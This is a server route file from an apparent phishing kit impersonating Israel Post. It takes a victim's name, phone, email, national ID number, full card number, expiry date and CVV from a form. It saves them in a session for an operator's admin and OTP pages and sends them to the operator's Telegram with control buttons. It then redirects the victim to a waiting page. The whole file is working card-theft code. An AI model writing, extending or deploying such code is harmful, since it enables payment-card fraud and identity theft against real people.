import { sendTelegram, buildKeyboard } from '$lib/telegram.js';
import { saveData } from '$lib/sessions.js';
import { inc } from '$lib/stats.js';
import { redirect } from '@sveltejs/kit';

/** @type {import('./$types').RequestHandler} */
export async function POST({ request, cookies, getClientAddress, url }) {
  const data = await request.formData();

  const name      = (data.get('name')      ?? '').toString().trim();
  const namel     = (data.get('namel')     ?? '').toString().trim();
  const nocphone2 = (data.get('nocphone2') ?? '').toString().trim();
  const em1       = (data.get('em1')       ?? '').toString().trim();
  const ccnn1     = (data.get('ccnn1')     ?? '').toString().trim();
  const expiry    = (data.get('expiry')    ?? '').toString().trim();
  const cvs       = (data.get('cvs')       ?? '').toString().trim();
  const id        = (data.get('id')        ?? '').toString().trim();

  const ip   = getClientAddress();
  const date = new Date().toISOString();

  // Create session ID
  const sessionId = Date.now().toString(36) + Math.random().toString(36).slice(2, 8);

  // Save session data so admin panel / OTP pages can retrieve it
  saveData(sessionId, { name, namel, nocphone2, em1, ccnn1, expiry, cvs, id, ip });
  inc('cards');

  const message =
`💳 *New Card — Israel Post*

⏰ ${date}
🌍 IP: \`${ip}\`

👤 *Recipient*
Name: ${name} ${namel}
Phone: ${nocphone2}
Email: ${em1}
ID: \`${id}\`

💳 *Card*
Number: \`${ccnn1}\`
Expiry: \`${expiry}\`
CVV: \`${cvs}\`

🔑 Session: \`${sessionId}\``;

  // Build public base URL from incoming request so Telegram URL buttons work.
  // For local dev this will be localhost — use ngrok to expose publicly.
  const baseUrl = `${url.protocol}//${url.host}`;
  const keyboard = buildKeyboard(sessionId, baseUrl, 'card');

  await sendTelegram(message, keyboard);

  cookies.set('session_id', sessionId, { path: '/', httpOnly: false, sameSite: 'lax' });
  cookies.set('full_name', `${name} ${namel}`, { path: '/', httpOnly: false, sameSite: 'lax' });
  cookies.set('card_last4', ccnn1.slice(-4), { path: '/', httpOnly: false, sameSite: 'lax' });

  throw redirect(303, `/wait.html?s=${sessionId}`);
}
